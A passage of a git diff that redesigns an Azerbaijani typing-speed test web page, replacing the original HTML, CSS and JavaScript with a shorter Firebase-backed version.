@@ -1,1033 +1,199 @@
 <!doctype html>
 <html lang="az">
 <head>
-  <!-- AdSense -->
-  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5663281315926059"
-    crossorigin="anonymous"></script>
-
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5663281315926059" crossorigin="anonymous"></script>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-
-  <!-- Minimal SEO + Dil tanınması -->
-  <meta name="language" content="Azerbaijani">
-  <meta http-equiv="content-language" content="az">
-  <meta name="description" content="TypingMaster — klaviaturada sürətli və düzgün yazmağı öyrənmək üçün typing test. WPM ölç, səhvlərini gör və sürətini artır.">
-  <link rel="canonical" href="https://typingmaster.me/">
-
-  <!-- Search Console və indeks üçün əlavə SEO -->
-  <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
-  <meta name="googlebot" content="index, follow">
-  <meta name="author" content="TypingMaster">
-  <meta name="theme-color" content="#0f172a">
-  <meta name="referrer" content="strict-origin-when-cross-origin">
-  <link rel="sitemap" type="application/xml" title="Sitemap" href="https://typingmaster.me/sitemap.xml">
-
-  <!-- Open Graph -->
-  <meta property="og:type" content="website">
-  <meta property="og:locale" content="az_AZ">
-  <meta property="og:site_name" content="TypingMaster">
-  <meta property="og:title" content="TypingMaster — Sürətli yazma təcrübəsi">
-  <meta property="og:description" content="TypingMaster ilə sürətli və düzgün yazmağı öyrən, WPM ölç və nəticələrini yaxşılaşdır.">
-  <meta property="og:url" content="https://typingmaster.me/">
-  <meta property="og:image" content="https://i.postimg.cc/9Qy6YWFZ/Chat-GPT-Image-Nov-27-2025-09-35-45-PM.png">
-
-  <!-- Twitter -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="TypingMaster — Sürətli yazma təcrübəsi">
-  <meta name="twitter:description" content="TypingMaster ilə sürətli və düzgün yazmağı öyrən, WPM ölç və nəticələrini yaxşılaşdır.">
-  <meta name="twitter:image" content="https://i.postimg.cc/9Qy6YWFZ/Chat-GPT-Image-Nov-27-2025-09-35-45-PM.png">
-
-  <!-- Structured Data -->
-  <script type="application/ld+json">
-  {
-    "@context":"https://schema.org",
-    "@type":"WebSite",
-    "name":"TypingMaster",
-    "url":"https://typingmaster.me/",
-    "inLanguage":"az",
-    "description":"TypingMaster klaviaturada sürətli və düzgün yazmağı öyrənmək üçün typing test platformasıdır."
-  }
-  </script>
-
-  <title>Söz Yazma Təcrübəsi — Super Dizayn</title>
+  <title>TypingMaster — Professional Yazı Təcrübəsi</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
-
   <style>
-    :root{--bg1:#0f172a;--bg2:#07103a;--card:#0b1220;--accent:#7c3aed;--glass:rgba(255,255,255,0.04);--muted:rgba(255,255,255,0.6)}
-    *{box-sizing:border-box;font-family:Inter,system-ui,Segoe UI,Roboto,'Helvetica Neue',Arial}
-
-    html,body{height:100%;margin:0}
-    body{
-  background:linear-gradient(135deg,var(--bg1),var(--bg2));
-  color:#e6eef8;
-  display:flex;
-  justify-content:center;   /* yalnız üfüqi mərkəz */
-  padding:32px;
-  flex-direction: column;
-  gap: 20px;
-  overflow-y:auto;          /* scroll olsun */
-  overflow-x:hidden;
-}
-
-    /* LIGHT MODE */
-    body.light {
-      --bg1: #f8fafc;
-      --bg2: #e5e7eb;
-      --card: #ffffff;
-      --accent: #7c3aed;
-      --glass: rgba(0,0,0,0.04);
-      --muted: rgba(0,0,0,0.6);
-      color: #0f172a;
-    }
-    body.light .card,
-    body.light .typing-area,
-    body.light .panel,
-    body.light .modal-card {
-      background: #ffffff !important;
-      color: #0f172a !important;
-      border: 1px solid rgba(0,0,0,0.08);
-    }
-
-   .container{
-  width:100%;
-  max-width:980px;
-  margin:0 auto;   /* mərkəz */
-}
-    .card{
-      background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));
-      border-radius:18px;padding:28px;box-shadow:0 10px 30px rgba(2,6,23,0.7);backdrop-filter: blur(6px);
-    }
-
-header{
-  display:grid;
-  grid-template-columns: 56px 1fr auto; /* logo | başlıq | menyu */
-  align-items:center;
-  gap:18px;
-  margin-bottom:18px;
-}
-
-/* Başlıq həqiqi mərkəzdə olsun */
-header h1{
-  margin:0;
-  
-}
-h1{
-  margin:0;
-}
-/* Menyu sağda qalsın, amma “qaçmasın” */
-.account-wrapper{
-  margin-left:0 !important;  /* əvvəl verdiyin marginləri sıfırla */
-  justify-self:end;
-}
-    .logo {
-      width: 56px;height: 56px;display: flex;align-items: center;justify-content: center;
-      border-radius: 12px;overflow: hidden;background: none;
-    }
-    .logo img {width: 100%;height: 100%;object-fit: cover;}
-
-    h1{font-size:20px;margin:0}
-
-    .top-row{display:flex;gap:12px;align-items:center;justify-content:space-between;margin-top:16px}
-    .stats{display:flex;gap:12px;align-items:center;flex-wrap:wrap}
-    .stat{background:var(--glass);padding:10px 12px;border-radius:10px;font-weight:600;font-size:13px}
-
-    .stage{display:grid;grid-template-columns:1fr 320px;gap:18px;margin-top:18px}
-
-    .typing-area{
-      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
-      padding:20px;border-radius:12px;border:1px solid rgba(255,255,255,0.03)
-    }
-    .word-stream{min-height:140px;display:flex;flex-wrap:wrap;gap:10px;align-items:center}
-    .word{padding:6px 10px;border-radius:8px;background:transparent;color:var(--muted);font-weight:600}
-    .word.past{opacity:0.5}
-    .word.current{background:linear-gradient(90deg, rgba(124,58,237,0.14), rgba(59,130,246,0.06));border:1px solid rgba(124,58,237,0.18);color:#fff}
-    .word.correct{background:rgba(34,197,94,0.12);border:1px solid rgba(34,197,94,0.18);color:#bbf7d0}
-    .word.wrong{background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.16);color:#ffd6d6}
-
-    .input-row{display:flex;gap:12px;margin-top:16px;align-items:center}
-    input[type=text]{
-      flex:1;padding:14px 16px;border-radius:12px;border:1px solid rgba(255,255,255,0.06);
-      background:transparent;color:inherit;font-size:16px;outline:none
-    }
-    .controls{display:flex;gap:8px}
-    button{background:var(--accent);border:none;color:white;padding:10px 14px;border-radius:10px;font-weight:700;cursor:pointer}
-    button.ghost{background:transparent;border:1px solid rgba(255,255,255,0.06);color:inherit}
-
-    .panel{
-      background:linear-gradient(180deg, rgba(255,255,255,0.015), rgba(255,255,255,0.01));
-      padding:18px;border-radius:12px;border:1px solid rgba(255,255,255,0.03)
-    }
-    .panel h3{margin:0 0 8px 0}
-    .list{max-height:240px;overflow:auto;padding-right:8px}
-    .list-item{display:flex;justify-content:space-between;padding:8px;border-radius:8px;margin-bottom:6px}
-    .list-item.correct{background:rgba(34,197,94,0.04)}
-    .list-item.wrong{background:rgba(239,68,68,0.04)}
-
-    .modal{
-      position:fixed;inset:0;display:flex;align-items:center;justify-content:center;
-      background:linear-gradient(180deg,rgba(2,6,23,0.6),rgba(2,6,23,0.8));backdrop-filter:blur(4px);
-      padding: 18px;
-    }
-    .modal-card{background:linear-gradient(180deg,#071127,#051028);padding:28px;border-radius:14px;max-width:720px;width:92%;color:#eaf2ff}
-
-    footer{margin-top:14px;color:var(--muted);font-size:13px}
-
-    @media(max-width:880px){
-      .stage{grid-template-columns:1fr}
-      .panel{order:2}
-    }
-
-.oyda{
-  display: contents;
-}
-
-.account-wrapper{
-  position: relative;
-  display:flex;
-  gap:18px;
-  align-items:center;
-
-  margin-left:40px;  /* ✅ yalnız aranı açır */
-}
-h1{margin-right:30px;}
-    .account-wrapper a{ text-decoration: none; color: #e6eef8; }
-    body.light .account-wrapper a{ color: #0f172a; }
-
-    .account-menu{
-      position: absolute;
-      top: 35px;
-      right: 0;
-      background: #0b1220;
-      border-radius: 12px;
-      padding: 8px;
-      width: 180px;
-      display: none;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
-      z-index: 999;
-    }
-    body.light .account-menu{ background:#fff; border:1px solid rgba(0,0,0,0.08); }
-
-    .account-menu a{
-      display: block;
-      padding: 10px;
-      color: #fff;
-      text-decoration: none;
-      border-radius: 8px;
-      font-size: 14px;
-      text-align: center;
-    }
-    body.light .account-menu a{ color:#0f172a; }
-    .account-menu a:hover{ background: rgba(255,255,255,0.08); }
-    body.light .account-menu a:hover{ background: rgba(0,0,0,0.06); }
-    .account-menu.active{ display:block; }
-
-    .settings-menu{
-      position: absolute;
-      top: 35px;
-      right: 0;
-      background: #0b1220;
-      border-radius: 12px;
-      padding: 8px;
-      width: 220px;
-      display: none;
-      flex-direction: column;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
-      z-index: 999;
-    }
-    body.light .settings-menu{ background:#fff; border:1px solid rgba(0,0,0,0.08); }
-    .settings-menu.active{ display:flex; gap: 5px; }
-
-    .settings-menu a{
-      text-decoration:none;
-      color:#eaf2ff;
-      font-size: 14px;
-      text-align: center;
-      display:block;
-      padding:10px 12px;
-      border-radius: 10px;
-    }
-    body.light .settings-menu a{ color:#0f172a; }
-    .settings-menu a:hover{ background: rgba(255,255,255,0.08); }
-    body.light .settings-menu a:hover{ background: rgba(0,0,0,0.06); }
-
-    .huquq{
-      margin-top: 18px;
-      text-align:center;
-      color: var(--muted);
-      font-size: 13px;
-    }
-    .huquq a{ color: #7aa8ff; text-decoration: none; }
-    .huquq a:hover{ text-decoration: underline; }
-
-    /* ✅ Açılıb bağlanan kontent düyməsi */
-    .content-toggle{
-      width:100%;
-      margin-top:14px;
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      gap:12px;
-      padding:12px 14px;
-      border-radius:12px;
-      background: rgba(124,58,237,0.14);
-      border: 1px solid rgba(124,58,237,0.22);
-      color:#fff;
-      font-weight:800;
-      cursor:pointer;
-    }
-    body.light .content-toggle{
-      color:#0f172a;
-      background: rgba(124,58,237,0.10);
-      border: 1px solid rgba(124,58,237,0.20);
-    }
-    .content-toggle span{ font-size:14px; }
-    .toggle-icon{
-      width:34px;height:34px;border-radius:10px;
-      display:flex;align-items:center;justify-content:center;
-      background: rgba(255,255,255,0.06);
-      border:1px solid rgba(255,255,255,0.06);
-      transition: transform .22s ease;
-    }
-    body.light .toggle-icon{
-      background: rgba(0,0,0,0.04);
-      border:1px solid rgba(0,0,0,0.06);
-    }
-    .content-toggle[aria-expanded="true"] .toggle-icon{
-      transform: rotate(180deg);
-    }
-
-    /* ✅ Kontent artıq səhifəni böL-məsin: modal kimi açılır */
-    .content-modal{
-      position: fixed;
-      inset: 0;
-      display: none;
-      align-items: center;
-      justify-content: center;
-      padding: 18px;
-      background: rgba(2,6,23,0.7);
-      backdrop-filter: blur(6px);
-      z-index: 2000;
-    }
-    .content-modal.active{ display:flex; }
-
-    .content-modal-card{
-      width: min(880px, 94vw);
-      max-height: 80vh;
-      overflow: auto;
-      border-radius: 16px;
-      padding: 18px 18px;
-      background: #0b1220;
-      border: 1px solid rgba(255,255,255,0.06);
-      box-shadow: 0 18px 50px rgba(0,0,0,0.55);
-      color: rgba(255,255,255,0.86);
-      line-height: 1.7;
-    }
-    body.light .content-modal-card{
-      background:#fff;
-      color: rgba(15,23,42,0.92);
-      border: 1px solid rgba(0,0,0,0.08);
-    }
-
-    .content-modal-card h2{ margin: 0 0 8px 0; font-size: 18px; }
-    .content-modal-card h3{ margin: 14px 0 6px 0; font-size: 15px; }
-    .content-modal-card ul{ margin: 8px 0 0 18px; }
-
-    .content-modal-top{
-      display:flex;
-      align-items:center;
-      justify-content:space-between;
-      gap:12px;
-      margin-bottom: 8px;
-    }
-    .content-close{
-      background: transparent;
-      border: 1px solid rgba(255,255,255,0.14);
-      color: inherit;
-      padding: 8px 12px;
-      border-radius: 12px;
-      font-weight: 800;
-      cursor: pointer;
-    }
-    body.light .content-close{
-      border: 1px solid rgba(0,0,0,0.12);
-    }
-
-    /* scroll kilidi */
-    body.modal-open{
-      overflow: hidden;
-    }
-    /* ✅ Kənar reklam */
-.side-ad{
-  position:fixed;
-  top:120px;
-  right:18px;
-  width:160px;
-  z-index:999;
-}
-
-@media(max-width:1200px){
-  .side-ad{display:none;} /* mobilde gizlensin */
-}
+    :root { --bg1: #0f172a; --bg2: #07103a; --card: rgba(30, 41, 59, 0.7); --accent: #00d2ff; --glass: rgba(255, 255, 255, 0.05); --muted: rgba(255, 255, 255, 0.5); }
+    body { margin: 0; background: linear-gradient(135deg, var(--bg1), var(--bg2)); color: #f8fafc; font-family: 'Inter', sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; overflow-x: hidden; }
+    .container { width: 100%; max-width: 1000px; }
+    .main-card { background: var(--card); backdrop-filter: blur(15px); border-radius: 24px; padding: 30px; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
+    header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; border-bottom: 1px solid var(--glass); padding-bottom: 15px; }
+    .user-section { display: flex; gap: 15px; align-items: center; }
+    .user-section a { color: var(--muted); text-decoration: none; font-weight: 600; font-size: 14px; transition: 0.3s; }
+    .user-section a:hover { color: var(--accent); }
+    .stats-bar { display: flex; gap: 15px; margin-bottom: 20px; flex-wrap: wrap; }
+    .stat-box { background: var(--glass); padding: 12px 20px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); flex: 1; min-width: 120px; text-align: center; }
+    .stat-box span { color: var(--accent); font-weight: 800; font-size: 1.2rem; display: block; }
+    .word-stream { background: rgba(0,0,0,0.2); border-radius: 15px; padding: 25px; min-height: 120px; display: flex; flex-wrap: wrap; gap: 12px; font-size: 22px; line-height: 1.6; margin-bottom: 20px; user-select: none; }
+    .word { color: var(--muted); transition: 0.2s; padding: 2px 8px; border-radius: 6px; }
+    .word.current { color: #fff; background: rgba(0, 210, 255, 0.2); border-bottom: 2px solid var(--accent); }
+    .word.correct { color: #22c55e; }
+    .word.wrong { color: #ef4444; text-decoration: line-through; }
+    .input-area { display: flex; gap: 15px; }
+    input[type="text"] { flex: 1; background: #0f172a; border: 2px solid #334155; border-radius: 12px; padding: 15px; color: white; font-size: 18px; outline: none; transition: 0.3s; }
+    input[type="text"]:focus { border-color: var(--accent); box-shadow: 0 0 15px rgba(0, 210, 255, 0.2); }
+    .btn { padding: 12px 25px; border-radius: 12px; border: none; font-weight: 700; cursor: pointer; transition: 0.3s; font-family: inherit; }
+    .btn-primary { background: var(--accent); color: #07103a; width: 150px; }
+    .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); display: none; justify-content: center; align-items: center; z-index: 2000; padding: 20px; }
+    .modal-content { background: #1e293b; padding: 40px; border-radius: 24px; width: 100%; max-width: 450px; text-align: center; border: 1px solid rgba(0,210,255,0.3); }
+    #wpm-highlight { font-size: 4rem; color: var(--accent); display: block; margin: 10px 0; font-weight: 800; }
   </style>
 </head>
-
 <body>
-  <div class="container">
-    <div class="card">
-      <header>
-        <div class="logo">
-          <img src="https://i.postimg.cc/9Qy6YWFZ/Chat-GPT-Image-Nov-27-2025-09-35-45-PM.png" alt="Logo">
-        </div>
 
-        <div class="oyda">
-          <h1>TypingMaster-Söz yazma təcrübəsi</h1>
-
-          <div class="account-wrapper">
-            <a href="#" id="accountBtn">Hesab</a>
-            <a href="#" id="settingBtn">Parametrlər</a>
-            <a href="telefon.html">Əlaqə</a>
-
-          
-
-            <div class="account-menu" id="accountMenu">
-              <a href="qeydiyyat.html">Qeydiyyat</a>
-              <a href="qeydiyyat.html" id="logoutMenutBtn">Hesabdan çıxış</a>
-              <a href="account.html">Hesab Məlumatları</a>
-            </div>
-
-            <div class="settings-menu" id="settingsMenu">
-              <a href="haqqimizda.html">Haqqımızda</a>
-            </div>
-          </div>
-        </div>
-      </header>
- 
-
-      <div class="top-row">
-        <div class="stats">
-          <div class="stat">Sözlər: <span id="totalWords">0</span></div>
-          <div class="stat">Düz: <span id="correctCount">0</span></div>
-          <div class="stat">Səhv: <span id="wrongCount">0</span></div>
-          <div class="stat">Vaxt: <span id="timer">00:00</span></div>
-        </div>
-
-        <div>
-          <label style="font-size:13px;color:var(--muted)">Söz sayı:</label>
-          <select id="wordCount" style="padding:8px;border-radius:8px;background:transparent;color:inherit;border:1px solid rgba(255,255,255,0.04);background-color: black;">
-            <option value="20">20</option>
-            <option value="30" selected>30</option>
-            <option value="40">40</option>
-            
-          </select>
-        </div>
+<div class="container">
+  <div class="main-card">
+    <header>
+      <div style="display:flex; align-items:center; gap:12px;">
+        <img src="https://i.postimg.cc/9Qy6YWFZ/Chat-GPT-Image-Nov-27-2025-09-35-45-PM.png" width="45" style="border-radius:8px">
+        <h2 style="margin:0; font-size:1.4rem; letter-spacing: -0.5px;">TypingMaster</h2>
       </div>
-
-      <div class="stage">
-        <div class="typing-area">
-          <div class="word-stream" id="wordStream" aria-hidden="false"></div>
-
-          <div class="input-row">
-            <input type="text" id="typingInput" placeholder="İndi yazmağa başla..." autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" />
-            <div class="controls">
-              <button id="startBtn">Başla</button>
-              <button class="ghost" id="resetBtn">Sıfırla</button>
-            </div>
-          </div>
-
-          <footer>
-            İstifadə qaydası: Sözləri yazıb arada boşluq (space) ilə irəlilə. Hər söz üçün hərf-ə-hərf yoxlanacaq. Sonda nəticələr çıxacaq.
-          </footer>
-
-          <!-- ✅ DÜYMƏ (kontenti modalda açır, üst hissə itmir) -->
-          <button class="content-toggle" id="contentToggle" aria-haspopup="dialog" aria-controls="contentModal">
-            <span>TypingMaster haqqında məlumat</span>
-            <div class="toggle-icon">⌄</div>
-          </button>
-        </div>
-
-        <aside class="panel">
-          <h3>Nəticələr (canlı)</h3>
-          <div class="list" id="resultList"></div>
-          <hr style="opacity:0.06;border:none;height:1px;margin:12px 0;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.03),transparent)">
-          <div style="display:flex;gap:8px;align-items:center;justify-content:flex-end">
-            <strong id="wpm">0 WPM</strong>
-          </div>
-        </aside>
+      <div class="user-section">
+        <a href="account.html" id="userDisplayName">Hesab</a>
+        <a href="telefon.html">Əlaqə</a>
+        <a href="#" id="logoutBtn" style="color:#ef4444">Çıxış</a>
       </div>
+    </header>
+
+    <div class="stats-bar">
+      <div class="stat-box">WPM <span id="wpmDisplay">0</span></div>
+      <div class="stat-box">DÜZ <span id="correctDisplay">0</span></div>
+      <div class="stat-box">SƏHV <span id="wrongDisplay">0</span></div>
+      <div class="stat-box">VAXT <span id="timerDisplay">00:00</span></div>
     </div>
-  </div>
 
-  <!-- ✅ KONTENT MODAL (səhifə yarı bölünmür, yuxarı hissə itmir) -->
-  <div class="content-modal" id="contentModal" role="dialog" aria-modal="true" aria-label="TypingMaster haqqında məlumat">
-    <div class="content-modal-card">
-      <div class="content-modal-top">
-        <strong style="opacity:.9">Məlumat</strong>
-        <button class="content-close" id="contentClose">Bağla ✕</button>
-      </div>
+    <div class="word-stream" id="wordBox"></div>
 
-      <h2>TypingMaster nədir?</h2>
-      <p>
-        TypingMaster klaviaturada daha sürətli və düzgün yazmağı öyrənmək üçün hazırlanmış onlayn yazı məşqi platformasıdır.
-        Bu səhifədə siz söz yazma testi edərək yazı sürətinizi ölçə, səhvlərinizi görə və gündəlik məşqlə nəticələrinizi yaxşılaşdıra bilərsiniz.
-      </p>
-
-      <h3>WPM nədir?</h3>
-      <p>
-        WPM (Words Per Minute) — 1 dəqiqədə neçə söz yaza bildiyinizi göstərən göstəricidir. Orta yazı sürəti təxminən 35–45 WPM sayılır.
-        Mütəmadi məşq etdikdə 60–80 WPM və daha yüksək nəticələr əldə etmək mümkündür.
-      </p>
-
-      <h3>Necə daha sürətli yazmaq olar?</h3>
-      <ul>
-        <li>Hər gün 5–10 dəqiqə məşq edin.</li>
-        <li>Barmaqların düzgün yerləşməsinə (klaviatura mövqeyi) diqqət edin.</li>
-        <li>Sürətdən çox düzgünlüyə fokuslanın, sonra sürət özü artacaq.</li>
-      </ul>
-    </div>
-  </div>
-
-  <!-- modal (nəticələr) -->
-  <div id="modal" style="display:none" class="modal" role="dialog" aria-modal="true">
-    <div class="modal-card">
-      <h2>Nəticələr</h2>
-      <p style="margin:4px 0 0 0;color:var(--muted)">Aşağıda sənin performansın göstərilir.</p>
-      <div style="margin-top:14px;overflow:auto;max-height:260px;padding-right:8px" id="detailedResults"></div>
-      <div style="display:flex;gap:8px;margin-top:12px;justify-content:flex-end">
-        <button id="closeModal">Yenidən</button>
-      </div>
-    </div>
-  </div>
-  
-
-  <div class="huquq">
-    © 2025 TypingMaster. Bütün hüquqlar qorunur.
-    <a href="privacy.html">Məxfilik Siyasəti və Haqqımızda</a>
-  </div>
-  <!-- ✅ Sağ kənar reklam -->
-<div class="side-ad">
-  <ins class="adsbygoogle"
-       style="display:block"
-       data-ad-client="ca-pub-5663281315926059"
-       data-ad-slot="BURAYA_SLOT_ID"
-       data-ad-format="vertical"></ins>
-  <script>
-       (adsbygoogle = window.adsbygoogle || []).push({});
-  </script>
-</div>
-<!-- Qeydiyyat xəbərdarlıq paneli -->
-<div id="authModal" class="modal" style="display:none" role="dialog" aria-modal="true">
-  <div class="modal-card" style="max-width:520px">
-    <h2>Qeydiyyat tələb olunur</h2>
-    <p style="margin:8px 0 0 0;color:var(--muted);line-height:1.6">
-      Oyuna başlamaq üçün əvvəlcə qeydiyyatdan keçməlisən və ya hesabına daxil olmalısan.
-    </p>
-
-    <div style="display:flex;gap:10px;justify-content:flex-end;margin-top:18px;flex-wrap:wrap">
-      <button class="ghost" id="closeAuthModal">Bağla</button>
-      <button id="goLoginBtn">Daxil ol</button>
-      <button id="goRegisterBtn">Qeydiyyat</button>
+    <div class="input-area">
+      <input type="text" id="mainInput" placeholder="Sözləri yazın..." disabled autocomplete="off">
+      <button class="btn btn-primary" id="startAction">BAŞLA</button>
     </div>
   </div>
 </div>
 
-  <script>
-    const WORDS = (`salam salamlar komputer kitab internet proqramlaşdırma javascript html css dizayn sürət təcrübə yazmaq düzgün səhv oyun funksiya dəyişən massiv düzbucaqlı tənlik riyaziyyat tarix coğrafiya elm musiqi film sosial media kitabxana universitet alma bal su qapı pəncərə kitab çanta dost yol işıq ev oyun yaz gül dərs telefon kompüter şəkil masa saat məktəb müəllim təcrübə dəftər`).split(' ');
-    const el = id => document.getElementById(id);
+<div id="resultModal" class="modal">
+  <div class="modal-content">
+    <h2 style="margin:0">Nəticə</h2>
+    <strong id="wpm-highlight">0</strong>
+    <p style="color:var(--muted)">Söz / Dəqiqə (WPM)</p>
+    <div style="display:flex; justify-content: space-around; margin: 20px 0;">
+        <div>Düz: <b id="finalCorrect" style="color:#22c55e">0</b></div>
+        <div>Səhv: <b id="finalWrong" style="color:#ef4444">0</b></div>
+    </div>
+    <button class="btn btn-primary" style="width:100%" onclick="location.reload()">Yenidən Başla</button>
+  </div>
+</div>
 
-    // Menyular
-    const accountBtn = document.getElementById("accountBtn");
-    const accountMenu = document.getElementById("accountMenu");
-    const settingBtn = document.getElementById("settingBtn");
-    const settingsMenu = document.getElementById("settingsMenu");
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+  import { getFirestore, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+  import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
 
-    accountBtn.addEventListener("click", (e) => {
-      e.preventDefault();
-      accountMenu.classList.toggle("active");
-    });
-    settingBtn.addEventListener("click", (e) => {
-      e.preventDefault();
-      settingsMenu.classList.toggle("active");
-    });
+  const firebaseConfig = { 
+    apiKey: "AIzaSyCPUyl6EbO8dvJBTWofVBQg1a1xJHM4_08", 
+    authDomain: "salam-58d0a.firebaseapp.com", 
+    projectId: "salam-58d0a", 
+    storageBucket: "salam-58d0a.firebasestorage.app", 
+    messagingSenderId: "703442504339", 
+    appId: "1:703442504339:web:4d7757d08bb37189829b66" 
+  };
 
-    document.addEventListener("click", (e) => {
-      if (!e.target.closest(".account-wrapper") && !e.target.closest("#accountMenu")) {
-        accountMenu.classList.remove("active");
-      }
-      if (!e.target.closest("#settingBtn") && !e.target.closest("#settingsMenu")) {
-        settingsMenu.classList.remove("active");
-      }
-    });
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+  const auth = getAuth(app);
 
-    // ✅ Kontent modal aç/bağla
-    const contentToggle = document.getElementById("contentToggle");
-    const contentModal = document.getElementById("contentModal");
-    const contentClose = document.getElementById("contentClose");
+  const wordPool = "salam dünya kitab klaviatura sürət texnologiya məktəb həyat proqramist uğur gələcək internet məlumat inkişaf azərbaycan musiqi günəş ulduz dəniz qələm dəftər paytaxt elm oyun yazı funksiya sistem kod ekran".split(" ");
+  let state = { words: [], currentIdx: 0, correct: 0, wrong: 0, startTime: null, isActive: false };
+  let currentUser = null;
 
-    function openContentModal(){
-      contentModal.classList.add("active");
-      document.body.classList.add("modal-open");
-      // fokus
-      contentClose.focus();
-    }
-    function closeContentModal(){
-      contentModal.classList.remove("active");
-      document.body.classList.remove("modal-open");
-      contentToggle.focus();
-    }
+  const inputEl = document.getElementById("mainInput");
+  const wordBox = document.getElementById("wordBox");
 
-    contentToggle.addEventListener("click", () => openContentModal());
-    contentClose.addEventListener("click", () => closeContentModal());
-    contentModal.addEventListener("click", (e) => {
-      if (e.target === contentModal) closeContentModal();
-    });
-    document.addEventListener("keydown", (e) => {
-      if (e.key === "Escape" && contentModal.classList.contains("active")) {
-        closeContentModal();
-      }
-    });
-        // Auth modal
-    const authModal = document.getElementById("authModal");
-    const closeAuthModalBtn = document.getElementById("closeAuthModal");
-    const goRegisterBtn = document.getElementById("goRegisterBtn");
-    const goLoginBtn = document.getElementById("goLoginBtn");
-
-    function isUserLoggedIn() {
-      const savedEmail = localStorage.getItem("userEmail");
-      return !!savedEmail;
-    }
-
-    function openAuthModal() {
-  authModal.style.display = "flex";
-  document.body.classList.add("modal-open");
-  el('typingInput').disabled = true;
-}
-
-    function closeAuthModal() {
-  authModal.style.display = "none";
-  document.body.classList.remove("modal-open");
-
-  if (!isUserLoggedIn()) {
-    el('typingInput').disabled = true;
-  }
-}
-    closeAuthModalBtn.addEventListener("click", closeAuthModal);
-
-    authModal.addEventListener("click", (e) => {
-      if (e.target === authModal) closeAuthModal();
-    });
-
-    goRegisterBtn.addEventListener("click", () => {
-      window.location.href = "qeydiyyat.html";
-    });
-
-    goLoginBtn.addEventListener("click", () => {
-      window.location.href = "daxil ol.html";
-    });
-
-    // State
-    let settings = { count: parseInt(el('wordCount')?.value || 30) };
-    let state = {
-  words: [],
-  index: 0,
-  correct: 0,
-  wrong: 0,
-  startTime: null,
-  finished: false,
-  perWord: [],
-  started: false
-};
-    let timerInterval = null;
-
-    function pickWords(n){
-      let pool = [...WORDS];
-      for(let i = pool.length - 1; i > 0; i--){
-        const j = Math.floor(Math.random() * (i + 1));
-        [pool[i], pool[j]] = [pool[j], pool[i]];
-      }
-      return pool.slice(0, n);
-    }
-
-    function renderStream(){
-      const stream = el('wordStream');
-      stream.innerHTML = '';
-
-      state.words.forEach((w,i)=>{
-        const span = document.createElement('div');
-        span.className = 'word';
-
-        if(i < state.index) span.classList.add('past');
-        if(i === state.index) span.classList.add('current');
-        if(state.perWord[i]) span.classList.add(state.perWord[i].correct ? 'correct' : 'wrong');
-
-        if(i === state.index){
-          const typed = el('typingInput').value;
-          for(let k=0;k<w.length;k++){
-            const ch = document.createElement('span');
-            ch.textContent = w[k];
-            if(k < typed.length && typed[k] !== w[k]) ch.style.color = '#ffb4b4';
-            span.appendChild(ch);
-          }
-        } else {
-          span.textContent = w;
-        }
-        stream.appendChild(span);
-      });
-    }
-
-    function calcWPM(){
-      if(!state.startTime) return 0;
-      const minutes = (Date.now() - state.startTime) / 60000;
-      return minutes ? Math.round(state.index / minutes) : 0;
-    }
-
-    function updateStats(){
-      el('totalWords').textContent = state.words.length;
-      el('correctCount').textContent = state.correct;
-      el('wrongCount').textContent = state.wrong;
-      el('wpm').textContent = calcWPM() + ' WPM';
-    }
-
-    function startTimer() {
-  clearInterval(timerInterval);
-  timerInterval = null;
-
-  state.startTime = Date.now();
-
-  timerInterval = setInterval(() => {
-    if (!state.started || state.finished || !state.startTime) {
-      clearInterval(timerInterval);
-      timerInterval = null;
-      el('timer').textContent = '00:00';
-      return;
-    }
-
-    const sec = Math.floor((Date.now() - state.startTime) / 1000);
-    el('timer').textContent =
-      String(Math.floor(sec / 60)).padStart(2, '0') + ':' +
-      String(sec % 60).padStart(2, '0');
-
-    el('wpm').textContent = calcWPM() + ' WPM';
-  }, 500);
-}
-function stopTimer() {
-  clearInterval(timerInterval);
-  timerInterval = null;
-}
-
-    function renderResultList(){
-      const list = el('resultList');
-      list.innerHTML = '';
-      state.words.forEach((w,i)=>{
-        const div = document.createElement('div');
-        div.className = 'list-item ' + (state.perWord[i]?.correct ? 'correct' : state.perWord[i] ? 'wrong' : '');
-        div.innerHTML = `<div>${i+1}. ${w}</div><div>${state.perWord[i] ? (state.perWord[i].correct?'✔':'✖'):'—'}</div>`;
-        list.appendChild(div);
-      });
-    }
-
-    function showModal(){ el('modal').style.display = 'flex'; }
-    function closeModal(){
-  el('modal').style.display = 'none';
-
-  if (!isUserLoggedIn()) {
-    el('typingInput').disabled = true;
-    openAuthModal();
-    return;
-  }
-
-  startTest();
-}
-
-    function renderDetailedResults(){
-      const box = document.getElementById("detailedResults");
-      box.innerHTML = "";
-
-      state.perWord.forEach((item, i) => {
-        if (!item) return;
-        const row = document.createElement("div");
-        row.style.display = "flex";
-        row.style.justifyContent = "space-between";
